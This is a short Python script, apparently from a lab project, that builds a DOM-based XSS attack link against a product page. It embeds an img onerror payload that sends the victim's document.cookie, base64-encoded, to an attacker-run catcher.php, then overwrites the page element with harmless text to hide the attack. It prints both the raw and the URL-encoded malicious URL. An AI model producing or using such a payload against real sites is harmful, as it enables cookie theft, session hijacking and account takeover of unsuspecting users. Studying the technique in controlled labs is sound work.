# DOM-based XSS Attack Link Builder

import urllib.parse

TARGET_IP = "192.168.1.62"
ATTACKER_IP = "192.168.1.62"
TARGET_URL = f"http://{TARGET_IP}/CyberProject/product_view.php?id=1"


payload = (
    f"<img src=x onerror=\""
    f"new Image().src='http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data='+btoa(document.cookie);"
    f"this.parentNode.innerHTML='Pick a tab to see more details about this product.'"
    f"\">"
)

malicious_link = f"{TARGET_URL}#{payload}"
encoded_link   = f"{TARGET_URL}#{urllib.parse.quote(payload, safe='')}"

print("=" * 60)
print(f"[!] DOM XSS Payload Generated (Target: {TARGET_IP})")
print("=" * 60)

print("\n--- Raw URL ---\n")
print(malicious_link)

print("\n--- Encoded URL ---\n")
print(encoded_link)

